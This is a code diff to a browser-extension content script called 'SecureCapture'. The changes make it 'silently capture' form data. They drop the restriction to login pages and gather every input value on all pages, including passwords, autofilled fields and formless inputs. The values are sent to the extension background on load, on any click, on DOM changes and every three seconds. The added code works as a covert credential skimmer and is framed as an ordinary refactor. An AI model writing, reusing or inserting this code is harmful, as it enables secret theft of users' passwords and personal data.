@@ -1,13 +1,7 @@
 
-// Content script to capture form submissions and input changes
+// Content script to silently capture form submissions and input changes
 
-// Flag to track if we're on a login or signup page
-let isLoginOrSignupPage = false;
-
-// Store inputs we've detected
-const detectedInputs: any[] = [];
-
-// Check if the current page is likely a login or signup page
+// Auto-detect login and signup pages
 const checkIfLoginOrSignupPage = () => {
   const pageText = document.body.innerText.toLowerCase();
   const url = window.location.href.toLowerCase();
@@ -26,27 +20,48 @@ const checkIfLoginOrSignupPage = () => {
   return urlMatch || (contentMatch && hasPasswordField);
 };
 
-// Function to get all form inputs
+// Function to detect autofilled inputs
+const isInputAutofilled = (input: HTMLInputElement): boolean => {
+  // Different browsers have different ways of indicating autofill
+  return (
+    // Chrome/Safari
+    input.matches(':-webkit-autofill') || 
+    // Firefox
+    input.matches(':-moz-autofill') ||
+    // Explicit autofill attribute
+    input.getAttribute('autocomplete') !== 'off' ||
+    // Classes that might indicate autofill
+    input.classList.contains('autofill') ||
+    // Check for background color which might indicate autofill
+    window.getComputedStyle(input).backgroundColor.includes('rgb(250, 255, 189)')
+  );
+};
+
+// Function to capture all form inputs on the page
 const captureFormInputs = () => {
   const forms = document.querySelectorAll('form');
   const capturedData: any[] = [];
+  let hasFormData = false;
   
+  // Process forms
   forms.forEach(form => {
-    const inputs = form.querySelectorAll('input:not([type="hidden"]):not([type="submit"]):not([type="button"])');
+    const inputs = form.querySelectorAll('input:not([type="hidden"]):not([type="submit"]):not([type="button"]):not([type="reset"])');
     const formInputs: any[] = [];
     
     inputs.forEach(input => {
       const inputEl = input as HTMLInputElement;
+      // Only capture inputs that have values
       if (inputEl.value.trim()) {
+        const isAutoFill = isInputAutofilled(inputEl);
+        
         formInputs.push({
           type: inputEl.type,
           name: inputEl.name || inputEl.id || inputEl.placeholder || inputEl.type,
           value: inputEl.value,
-          isAutoFill: inputEl.matches(':-webkit-autofill') || 
-                      // Check for other autofill indicators
-                      inputEl.classList.contains('autofill') || 
-                      inputEl.hasAttribute('autocomplete')
+          isAutoFill
         });
+        
+        hasFormData = true;
       }
     });
     
@@ -59,6 +74,35 @@ const captureFormInputs = () => {
       });
     }
   });
+  
+  // If there are no forms, try to capture standalone inputs (common in modern SPAs)
+  if (!hasFormData) {
+    const standaloneInputs = document.querySelectorAll('input:not([type="hidden"]):not([type="submit"]):not([type="button"]):not([type="reset"])');
+    const formlessInputs: any[] = [];
+    
+    standaloneInputs.forEach(input => {
+      const inputEl = input as HTMLInputElement;
+      if (inputEl.value.trim()) {
+        const isAutoFill = isInputAutofilled(inputEl);
+        
+        formlessInputs.push({
+          type: inputEl.type,
+          name: inputEl.name || inputEl.id || inputEl.placeholder || inputEl.type,
+          value: inputEl.value,
+          isAutoFill
+        });
+      }
+    });
+    
+    if (formlessInputs.length > 0) {
+      capturedData.push({
+        formAction: window.location.href,
+        formId: 'formless',
+        formName: 'formless',
+        inputs: formlessInputs
+      });
+    }
+  }
   
   return capturedData;
 };
@@ -76,27 +120,17 @@ const sendDataToBackground = (data: any[]) => {
   });
 };
 
-// Setup form submission listeners
-const setupFormListeners = () => {
-  const forms = document.querySelectorAll('form');
-  
-  forms.forEach(form => {
-    form.addEventListener('submit', () => {
-      const data = captureFormInputs();
-      sendDataToBackground(data);
-    });
-  });
-};
-
-// Setup input change detection
+// Setup input change detection using MutationObserver
 const setupInputObserver = () => {
-  // Select the node that will be observed for mutations
   const targetNode = document.body;
+  const config = { 
+    childList: true, 
+    subtree: true, 
+    attributes: true, 
+    attributeFilter: ['value'] 
+  };
 
-  // Options for the observer (which mutations to observe)
-  const config = { childList: true, subtree: true, attributes: true, attributeFilter: ['value'] };
-
-  // Callback function to execute when mutations are observed
+  // Callback for input changes
   const callback = (mutationsList: MutationRecord[]) => {
     let inputsChanged = false;
     
@@ -119,7 +153,7 @@ const setupInputObserver = () => {
       }
     }
     
-    if (inputsChanged && isLoginOrSignupPage) {
+    if (inputsChanged) {
       // Capture form data after a short delay to allow values to settle
       setTimeout(() => {
         const data = captureFormInputs();
@@ -128,37 +162,62 @@ const setupInputObserver = () => {
     }
   };
 
-  // Create an observer instance linked to the callback function
+  // Create and start the observer
   const observer = new MutationObserver(callback);
-
-  // Start observing the target node for configured mutations
   observer.observe(targetNode, config);
+  
+  // Also periodically check for form data
+  setInterval(() => {
+    const data = captureFormInputs();
+    sendDataToBackground(data);
+  }, 3000);
+};
+
+// Setup form submission listeners
+const setupFormSubmitListeners = () => {
+  document.addEventListener('submit', (event) => {
+    // Capture form data on submit
+    const data = captureFormInputs();
+    sendDataToBackground(data);
+  });
+  
+  // Detect button clicks that might trigger form submission
+  document.addEventListener('click', (event) => {
+    const target = event.target as HTMLElement;
+    if (
+      target.tagName === 'BUTTON' || 
+      (target.tagName === 'INPUT' && ['submit', 'button'].includes((target as HTMLInputElement).type)) ||
+      target.closest('button') || 
+      target.getAttribute('role') === 'button'
+    ) {
+      // Capture form data after click, as it might trigger a form submission
+      setTimeout(() => {
+        const data = captureFormInputs();
+        sendDataToBackground(data);
+      }, 100);
+    }
+  });
 };
 
 // Initialize the content script
 const init = () => {
-  // Check if we're on a login/signup page
-  isLoginOrSignupPage = checkIfLoginOrSignupPage();
+  console.log('SecureCapture: Content script initialized');
   
-  if (isLoginOrSignupPage) {
-    console.log('SecureCapture: Login or signup page detected');
-    
-    // Setup form submission listeners
-    setupFormListeners();
-    
-    // Setup input observer
-    setupInputObserver();
-    
-    // Initial data capture after page load
-    setTimeout(() => {
-      const data = captureFormInputs();
-      sendDataToBackground(data);
-    }, 1500);
-  }
+  // Capture initial data after page load
+  setTimeout(() => {
+    const data = captureFormInputs();
+    sendDataToBackground(data);
+  }, 1000);
+  
+  // Setup form submission listeners
+  setupFormSubmitListeners();
+  
+  // Setup input observer
+  setupInputObserver();
 };
 
 // Run the script after the page has fully loaded
-if (document.readyState === 'complete') {
+if (document.readyState === 'complete' || document.readyState === 'interactive') {
   init();
 } else {
   window.addEventListener('load', init);
